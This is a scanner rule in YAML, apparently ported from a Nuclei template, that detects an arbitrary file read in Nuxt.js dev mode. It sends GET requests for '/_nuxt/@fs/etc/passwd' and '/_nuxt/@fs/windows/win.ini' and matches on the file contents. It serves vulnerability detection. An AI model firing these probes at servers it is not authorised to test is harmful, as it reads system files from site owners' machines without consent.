schema_version: 1
id: "cortex.community:nuxt-js-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Arbitrary File Read in Dev Mode - Nuxt.js"
  description: "Vite is misconfigured within nuxt to permit any file to be retrieved from the file system. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/"
    - "https://bryces.io/blog/nuxt3"
    - "https://twitter.com/fofabot/status/1669339995780558849"
  cwes: [22]
  tags: ["huntr", "lfi", "nuxtjs", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/_nuxt/@fs/etc/passwd" }
  - id: "probe1"
    request: { method: "GET", path: "/_nuxt/@fs/windows/win.ini" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - any:
          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "\\[(font|extension|file)s\\]" } }
      - any:
          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:.*:0:0:" } }
          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "\\[(font|extension|file)s\\]" } }
